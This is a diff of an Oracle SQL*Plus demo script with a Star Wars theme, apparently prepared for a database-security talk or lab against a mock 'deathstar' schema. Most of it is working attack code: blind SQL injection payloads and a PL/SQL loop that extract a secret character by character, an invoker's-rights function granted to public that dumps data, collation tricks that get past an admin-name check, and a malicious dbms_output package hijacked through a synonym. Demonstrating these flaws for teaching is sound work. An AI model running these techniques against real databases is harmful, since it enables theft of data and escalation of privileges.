@@ -3,21 +3,31 @@ set pagesize 1000
 set trimout on
 column name format a30
 column code format a60
-#pause
-update deathstar_rooms....
+column USERNAME format a30
+column GRANTED_ROLE format a30
+column SECRET format a30
+column CREATED format a30
+column MESSAGE format a60
+alter session set nls_date_format='dd.MM.yyyy hh:mi:ss';
+
+rem update deathstar_rooms...
 set echo on
+cl scr
+connect sabine/sabine
 
-select room_info.get_room_id(''') and exists(select 1 from imperial_secrets where id = 1 and lower(substr(secret, 1, 1)) = ''a'') --') result from dual;
+select deathstar.room_info.get_room_id(''') and exists(select 1 from imperial_secrets where id = 1 and lower(substr(secret, 1, 1)) = ''a'') --') result from dual;
 #pause
-select room_info.get_room_id(''') and exists(select 1 from imperial_secrets where id = 1 and lower(substr(secret, 1, 1)) = ''b'') --') result from dual;
+select deathstar.room_info.get_room_id(''') and exists(select 1 from imperial_secrets where id = 1 and lower(substr(secret, 1, 1)) = ''b'') --') result from dual;
 #pause
-select room_info.get_room_id(''') and exists(select 1 from imperial_secrets where id = 1 and lower(substr(secret, 1, 1)) = ''c'') --') result from dual;
+select deathstar.room_info.get_room_id(''') and exists(select 1 from imperial_secrets where id = 1 and lower(substr(secret, 1, 1)) = ''c'') --') result from dual;
 #pause
 
-select room_info.get_room_id(''') and exists(select 1 from imperial_secrets where id = 1 and lower(substr(secret, 1, 1)) = ''v'') --') result from dual;
+select deathstar.room_info.get_room_id(''') and exists(select 1 from imperial_secrets where id = 1 and lower(substr(secret, 1, 1)) = ''v'') --') result from dual;
 #pause
 
 set serveroutput on
+cl scr
+
 declare
   l_secret varchar2(4000);
 
@@ -31,12 +41,14 @@ declare
         l_malicious_stmt :=
             ''') and exists(select 1 from imperial_secrets where id = 1 and' ||
             ' lower(substr(secret, ' || i_idx || ', 1)) = ''' || lower(chr(char_ascii)) || ''') --';
-        if (room_info.get_room_id(l_malicious_stmt) = 1) then
+        if (deathstar.room_info.get_room_id(l_malicious_stmt) = 1) then
           return chr(char_ascii);
         end if;
       end loop;
     return '?';
-  end;
+  end chk_char;
+#pause
+  
 begin
   begin
     for idx in 1..30
@@ -53,28 +65,37 @@ end;
 #pause
 
 #pause/**/
-select code from deathstar_rooms;
+
+connect deathstar/deathstar
+cl scr
+select code from deathstar.deathstar_rooms;
 #pause
-select * from user_roles;
-select * from users;
+cl scr
+select * from deathstar.user_roles;
+select * from deathstar.users;
 #pause
-call room_info.allow_room_access(2, 1);
+call deathstar.room_info.allow_room_access(2, 1);
 #pause
-select * from user_roles;
+cl scr
+select * from deathstar.user_roles;
 #pause
-select * from log_201911;
+cl scr
+select * from deathstar.log_201911;
 #pause
 
 #pause/**/
+cl scr
 
-connect sabine/sabine@localhost:1522/ORCLPDB1
+connect sabine/sabine
 #pause
-
+cl scr
 create table secret_dump (
   secret varchar2(4000),
   created timestamp default current_timestamp
 );
 
+#pause
+cl scr
 create or replace function bad_func
   return varchar2 authid current_user -- Invoker's rights!
   as
@@ -89,28 +110,29 @@ create or replace function bad_func
 grant execute on bad_func to public;
 grant insert on secret_dump to public;
 #pause
+cl scr
 
 truncate table secret_dump;
 select * from secret_dump;
 #pause
+cl scr
 
 select deathstar.room_info.get_room_id(''') and sabine.bad_func() = ''Y''--') from dual;
-#pause
 
 select * from secret_dump;
 #pause
 
 #pause/**/
+cl scr
 
 ALTER SESSION SET NLS_SORT = BINARY_AI NLS_COMP = LINGUISTIC;
-#pause
+
 select deathstar.is_admin('aDMIN') from dual;
-#pause
 select deathstar.is_admin('Ädmin') from dual;
-#pause
 
 #pause/**/
 
+cl scr
 create or replace trigger trg_client_detection
 after logon
 on database
@@ -119,12 +141,14 @@ begin
 end;
 /
 #pause
-connect deathstar/deathstar@localhost:1522/ORCLPDB1
+cl scr
+connect deathstar/deathstar
 #pause
 select is_admin('Ädmin') from dual;
 #pause
+cl scr
+connect sabine/sabine
 
-connect sabine/sabine@localhost:1522/ORCLPDB1
 create or replace package malicious_dbms_output authid current_user as
   procedure put_line( i_input varchar2 );
 end;
@@ -156,6 +180,7 @@ end;
 
 grant execute on malicious_dbms_output to public;
 #pause
+cl scr
 select username, granted_role from user_role_privs;
 #pause/**/
 
@@ -166,6 +191,7 @@ create synonym darth_dba.dbms_output for malicious_dbms_output;
 set serveroutput on
 select deathstar.room_info.get_room_id('Vader') from dual;
 #pause
+cl scr
 
 --     _____                                             __     __)
 --    (, /  |              . .    /)                    (, /|  /|
